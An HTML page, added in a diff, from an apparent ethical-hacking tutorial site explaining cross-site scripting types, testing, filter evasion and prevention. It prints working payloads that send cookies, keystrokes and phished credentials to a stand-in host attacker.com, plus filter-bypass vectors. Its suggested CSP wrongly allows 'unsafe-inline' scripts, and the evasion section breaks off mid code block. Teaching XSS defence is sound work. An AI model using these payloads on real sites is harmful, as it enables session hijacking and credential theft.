@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4579344894934796" crossorigin="anonymous"></script>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-047Q5LKQHS"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){ dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-047Q5LKQHS');
+  </script>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cross-Site Scripting (XSS) Attacks Explained with Real Examples | HowCanIHack.com</title>
+  <meta name="description" content="" />
+  <meta property="og:title" content="Cross-Site Scripting (XSS) Attacks Explained with Real Examples" />
+  <meta property="og:description" content="" />
+  <meta property="og:type" content="article" />
+  <link rel="canonical" href="https://howcanihack.com/tutorials/cross-site-scripting-xss-attacks-explained-with-real-examples.html" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Sans:wght@300;400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --navy: #0a1628; --blue: #1d4ed8; --sky: #dbeafe;
+      --gray50: #f8fafc; --gray100: #f1f5f9; --gray200: #e2e8f0;
+      --gray600: #475569; --text: #0f172a;
+      --mono: 'JetBrains Mono', monospace;
+      --serif: 'DM Serif Display', serif;
+      --sans: 'DM Sans', sans-serif;
+    }
+    body { font-family: var(--sans); color: var(--text); background: #fff; }
+    nav {
+      position: sticky; top: 0; z-index: 100;
+      background: rgba(255,255,255,0.92); backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--gray200);
+      padding: 0 2rem; display: flex; align-items: center;
+      justify-content: space-between; height: 64px;
+    }
+    .nav-logo {
+      font-family: var(--mono); font-size: 1rem; font-weight: 600;
+      color: var(--navy); text-decoration: none;
+    }
+    .nav-logo span { color: var(--blue); }
+    .nav-home { font-size: 0.875rem; color: var(--gray600); text-decoration: none; }
+    .nav-home:hover { color: var(--blue); }
+    .article-wrap { max-width: 780px; margin: 0 auto; padding: 3rem 1.5rem 5rem; }
+    .article-meta {
+      display: flex; gap: 1rem; align-items: center; flex-wrap: wrap;
+      margin-bottom: 2rem;
+    }
+    .tag {
+      display: inline-block; background: var(--sky); color: var(--blue);
+      font-size: 0.7rem; font-weight: 600; font-family: var(--mono);
+      padding: 0.2rem 0.6rem; border-radius: 4px; text-transform: uppercase;
+    }
+    .date { font-family: var(--mono); font-size: 0.78rem; color: var(--gray600); }
+    h1 {
+      font-family: var(--serif); font-size: clamp(2rem, 5vw, 3rem);
+      color: var(--navy); line-height: 1.15; margin-bottom: 1.5rem;
+    }
+    .lead {
+      font-size: 1.15rem; color: var(--gray600); line-height: 1.8;
+      margin-bottom: 2.5rem; border-left: 3px solid var(--blue);
+      padding-left: 1.25rem;
+    }
+    h2 {
+      font-family: var(--serif); font-size: 1.6rem; color: var(--navy);
+      margin: 2.5rem 0 1rem;
+    }
+    h3 { font-size: 1.1rem; font-weight: 600; color: var(--navy); margin: 1.5rem 0 0.75rem; }
+    p { line-height: 1.8; color: #334155; margin-bottom: 1.25rem; }
+    pre {
+      background: var(--navy); color: #e2e8f0; border-radius: 10px;
+      padding: 1.5rem; overflow-x: auto; margin: 1.5rem 0;
+      font-family: var(--mono); font-size: 0.85rem; line-height: 1.7;
+    }
+    code { font-family: var(--mono); font-size: 0.875em; background: var(--sky); color: var(--blue); padding: 0.1em 0.4em; border-radius: 3px; }
+    pre code { background: none; color: inherit; padding: 0; }
+    ul, ol { padding-left: 1.5rem; margin-bottom: 1.25rem; }
+    li { line-height: 1.8; color: #334155; margin-bottom: 0.4rem; }
+    .cta-box {
+      background: var(--navy); border-radius: 12px; padding: 2rem;
+      text-align: center; margin: 3rem 0;
+    }
+    .cta-box p { color: #94a3b8; margin-bottom: 1rem; }
+    .cta-box a {
+      background: var(--blue); color: #fff; text-decoration: none;
+      padding: 0.75rem 1.75rem; border-radius: 8px; font-weight: 600;
+      font-size: 0.95rem;
+    }
+    footer {
+      background: var(--navy); color: #94a3b8;
+      text-align: center; padding: 2rem;
+      font-size: 0.82rem;
+    }
+    footer a { color: #94a3b8; text-decoration: none; }
+  </style>
+</head>
+<body>
+<nav>
+  <a href="/" class="nav-logo"><span>[</span>howcanihack<span>]</span></a>
+  <a href="/" class="nav-home">← Back to Home</a>
+</nav>
+
+<article class="article-wrap">
+  <div class="article-meta">
+    <span class="tag">tutorials</span>
+    <span class="date">March 18, 2026</span>
+    <span class="date">6 min read</span>
+  </div>
+
+  <h1>Cross-Site Scripting (XSS) Attacks Explained with Real Examples</h1>
+
+<p class="lead">Cross-Site Scripting (XSS) attacks remain one of the most prevalent web vulnerabilities, affecting millions of websites worldwide. Whether you're a budding ethical hacker or a developer looking to secure your applications, understanding XSS is crucial for both offense and defense in cybersecurity.</p>
+
+<p>XSS attacks occur when malicious scripts are injected into trusted websites, allowing attackers to execute code in users' browsers. These vulnerabilities consistently rank in the OWASP Top 10, making them essential knowledge for anyone serious about web security. In this comprehensive guide, we'll explore the different types of XSS attacks, demonstrate real-world examples, and show you how to both identify and prevent these dangerous vulnerabilities.</p>
+
+<h2>Understanding Cross-Site Scripting Fundamentals</h2>
+
+<p>Cross-Site Scripting attacks exploit the trust relationship between a user and a website. When a web application fails to properly validate, sanitize, or escape user input before displaying it in the browser, attackers can inject malicious JavaScript code that executes within the victim's browser context.</p>
+
+<p>The core issue lies in how web browsers handle dynamic content. When a browser encounters JavaScript code within HTML, it executes that code automatically, assuming it's legitimate. XSS attacks abuse this behavior by tricking applications into including attacker-controlled scripts in their responses.</p>
+
+<p><strong>Key characteristics of XSS vulnerabilities:</strong></p>
+<ul>
+<li>They execute in the victim's browser, not on the server</li>
+<li>They inherit the victim's permissions and session tokens</li>
+<li>They can access cookies, local storage, and DOM elements</li>
+<li>They bypass same-origin policy restrictions</li>
+</ul>
+
+<p>Understanding these fundamentals is crucial because XSS attacks don't just display pop-up alerts—they can steal sensitive data, hijack user sessions, deface websites, or even install malware.</p>
+
+<h2>Types of XSS Attacks with Practical Examples</h2>
+
+<h3>Reflected XSS (Non-Persistent)</h3>
+
+<p>Reflected XSS occurs when malicious scripts are immediately returned in the web application's response. The attack payload is typically embedded in URLs or form submissions and "reflected" back to the user without proper sanitization.</p>
+
+<p><strong>Example scenario:</strong> Consider a search functionality that displays the search term back to the user:</p>
+
+<pre><code>https://vulnerable-site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+
+<p>If the application displays the search term without encoding, the browser executes the JavaScript. A more realistic attack might steal session cookies:</p>
+
+<pre><code>&lt;script&gt;
+document.location='http://attacker.com/steal.php?cookie='+document.cookie;
+&lt;/script&gt;</code></pre>
+
+<p>Attackers typically shorten malicious URLs using services like bit.ly to hide the payload and increase click-through rates in phishing campaigns.</p>
+
+<h3>Stored XSS (Persistent)</h3>
+
+<p>Stored XSS is more dangerous because the malicious payload is permanently stored on the target server. Every user who views the infected page triggers the attack, making it particularly effective for widespread compromise.</p>
+
+<p><strong>Common locations for stored XSS:</strong></p>
+<ul>
+<li>Comment sections and forums</li>
+<li>User profile fields</li>
+<li>Message boards and chat applications</li>
+<li>Blog posts and article submissions</li>
+</ul>
+
+<p>Here's an example payload for a comment field:</p>
+
+<pre><code>&lt;img src="x" onerror="fetch('http://attacker.com/log.php?data='+btoa(document.cookie))"&gt;</code></pre>
+
+<p>This payload appears as a broken image but silently transmits the victim's cookies to the attacker's server using base64 encoding.</p>
+
+<h3>DOM-Based XSS</h3>
+
+<p>DOM-Based XSS occurs entirely within the client-side code. The vulnerability exists in the JavaScript that processes user input and updates the Document Object Model (DOM) without proper validation.</p>
+
+<p>Consider this vulnerable JavaScript code:</p>
+
+<pre><code>var userInput = location.hash.substr(1);
+document.getElementById('welcome').innerHTML = 'Hello ' + userInput;</code></pre>
+
+<p>An attacker could craft a URL like:</p>
+
+<pre><code>https://site.com/page.html#&lt;img src=x onerror=alert('DOM XSS')&gt;</code></pre>
+
+<p>The malicious code executes when the JavaScript processes the URL fragment, making this attack type particularly sneaky since it doesn't involve server-side processing.</p>
+
+<h2>Identifying XSS Vulnerabilities</h2>
+
+<p>Learning to identify XSS vulnerabilities is essential for both penetration testers and developers. The process involves systematic testing of input fields and analyzing how applications handle user data.</p>
+
+<h3>Manual Testing Techniques</h3>
+
+<p>Start with simple test payloads to identify potential injection points:</p>
+
+<pre><code># Basic test vectors
+&lt;script&gt;alert(1)&lt;/script&gt;
+'&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+javascript:alert(1)
+&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+<p>Test these payloads in various locations:</p>
+<ul>
+<li>URL parameters and form fields</li>
+<li>HTTP headers (User-Agent, Referer)</li>
+<li>File upload functionality</li>
+<li>Search boxes and input fields</li>
+</ul>
+
+<p><strong>Advanced testing involves bypassing common filters:</strong></p>
+
+<pre><code># Bypassing basic filters
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;script&gt;ale&lt;script&gt;rt(1)&lt;/script&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;</code></pre>
+
+<h3>Automated Tools and Techniques</h3>
+
+<p>While manual testing is crucial, automated tools can help discover XSS vulnerabilities more efficiently:</p>
+
+<pre><code># Using XSStrike for automated XSS detection
+python3 xsstrike.py -u "https://target.com/search?q=FUZZ"
+
+# Burp Suite Intruder with XSS payloads
+# Configure payload positions and load XSS wordlists
+
+# OWASP ZAP scanning
+zap-baseline.py -t https://target.com</code></pre>
+
+<p>Remember that automated tools often produce false positives, so manual verification of findings is essential for accurate reporting.</p>
+
+<h2>XSS Attack Vectors and Payloads</h2>
+
+<p>Understanding different attack vectors helps both in exploitation and defense. Modern XSS attacks go far beyond simple alert boxes, incorporating sophisticated techniques for data extraction and system compromise.</p>
+
+<h3>Cookie Stealing and Session Hijacking</h3>
+
+<p>One of the most common XSS attack objectives is stealing session cookies:</p>
+
+<pre><code>&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://attacker.com/collect', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('cookies=' + encodeURIComponent(document.cookie));
+&lt;/script&gt;</code></pre>
+
+<h3>Keylogging and Form Hijacking</h3>
+
+<p>XSS can implement client-side keyloggers to capture sensitive information:</p>
+
+<pre><code>&lt;script&gt;
+document.addEventListener('keydown', function(e) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://attacker.com/keylog', true);
+    xhr.send('key=' + e.key + '&target=' + e.target.name);
+});
+&lt;/script&gt;</code></pre>
+
+<h3>Phishing and Social Engineering</h3>
+
+<p>XSS can create convincing phishing forms within trusted websites:</p>
+
+<pre><code>&lt;div style="position:absolute; top:0; left:0; width:100%; height:100%; background:white; z-index:9999;"&gt;
+&lt;form action="http://attacker.com/phish"&gt;
+&lt;h2&gt;Session Expired - Please Login Again&lt;/h2&gt;
+Username: &lt;input name="user"&gt;&lt;br&gt;
+Password: &lt;input name="pass" type="password"&gt;&lt;br&gt;
+&lt;input type="submit" value="Login"&gt;
+&lt;/form&gt;
+&lt;/div&gt;</code></pre>
+
+<h2>Prevention and Mitigation Strategies</h2>
+
+<p>Preventing XSS attacks requires a multi-layered approach combining input validation, output encoding, and security headers. Understanding these defenses is crucial for developers and security professionals.</p>
+
+<h3>Input Validation and Sanitization</h3>
+
+<p>Implement strict input validation on both client and server sides:</p>
+
+<pre><code># Python example using html.escape
+import html
+
+def sanitize_input(user_input):
+    # Remove or encode dangerous characters
+    clean_input = html.escape(user_input, quote=True)
+    return clean_input
+
+# PHP example
+$clean_input = htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');</code></pre>
+
+<h3>Content Security Policy (CSP)</h3>
+
+<p>Implement robust CSP headers to prevent unauthorized script execution:</p>
+
+<pre><code>Content-Security-Policy: default-src 'self'; 
+script-src 'self' 'unsafe-inline' https://trusted-cdn.com; 
+object-src 'none'; 
+base-uri 'self';</code></pre>
+
+<h3>Output Encoding</h3>
+
+<p>Always encode output based on the context where data will be displayed:</p>
+
+<ul>
+<li><strong>HTML Context:</strong> Use HTML entity encoding</li>
+<li><strong>JavaScript Context:</strong> Use JavaScript escaping</li>
+<li><strong>CSS Context:</strong> Use CSS escaping</li>
+<li><strong>URL Context:</strong> Use URL encoding</li>
+</ul>
+
+<h2>Real-World XSS Case Studies</h2>
+
+<p>Learning from real-world XSS incidents helps understand the practical impact of these vulnerabilities. Major platforms like Facebook, Twitter, and Google have all experienced significant XSS vulnerabilities that led to user data compromise.</p>
+
+<p>In 2014, a stored XSS vulnerability in eBay affected millions of users when attackers injected malicious JavaScript into product listings. The attack remained undetected for months, highlighting the persistent nature of stored XSS vulnerabilities.</p>
+
+<p>More recently, TikTok suffered from multiple XSS vulnerabilities that could have allowed attackers to take over user accounts by simply sending malicious links. These incidents demonstrate that even major technology companies struggle with XSS prevention.</p>
+
+<h2>Advanced XSS Techniques and Evasion</h2>
+
+<p>As web applications implement better defenses, attackers develop more sophisticated bypass techniques. Understanding these advanced methods is crucial for thorough security testing.</p>
+
+<h3>Filter Evasion Techniques</h3>
+
+<p>Modern XSS attacks often need to bypass various filtering mechanisms:</p>
+
+<pre><code># Using alternate encodings
+&lt;img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"&gt;
+
+#
+
+  <div class="cta-box">
+    <p>Want more cybersecurity tutorials delivered to your inbox?</p>
+    <a href="/#newsletter">Subscribe Free →</a>
+  </div>
+</article>
+
+<footer>
+  <p>© 2026 <a href="/">HowCanIHack.com</a> — For educational purposes only. Always obtain proper authorization before testing any system.</p>
+</footer>
+</body>
+</html>
